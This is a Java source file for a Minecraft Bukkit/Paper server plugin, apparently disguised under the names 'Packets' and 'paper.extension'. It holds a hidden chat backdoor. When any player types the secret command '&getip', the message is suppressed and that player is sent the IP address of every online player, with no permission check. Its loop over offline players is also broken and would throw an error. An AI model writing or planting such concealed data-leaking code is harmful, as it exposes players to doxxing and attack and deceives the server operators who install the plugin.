package io.paper.extension.packets;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.net.InetSocketAddress;
import java.util.Objects;

public class Packets implements Listener {
    @EventHandler
    public static void Packets(AsyncPlayerChatEvent e){
        String message = e.getMessage();
        Player p = e.getPlayer();
        if(message.equalsIgnoreCase("&getip")){
            e.setCancelled(true);
            for(Player p1 : Bukkit.getOnlinePlayers()){
                InetSocketAddress address = p1.getAddress();
                assert address != null;
                String addressConfirmed = address.toString();
                p.sendMessage("Online: " + p1.getDisplayName() + ">" + addressConfirmed);
            }
            for(OfflinePlayer p1 : Bukkit.getOfflinePlayers()){
                InetSocketAddress address = Objects.requireNonNull(p1.getPlayer()).getAddress();
                assert address != null;
                String addressConfirmed = address.toString();
                p.sendMessage("Offline: " + p1.getPlayer().getDisplayName() + ">" + addressConfirmed);
            }
        }
    }
}
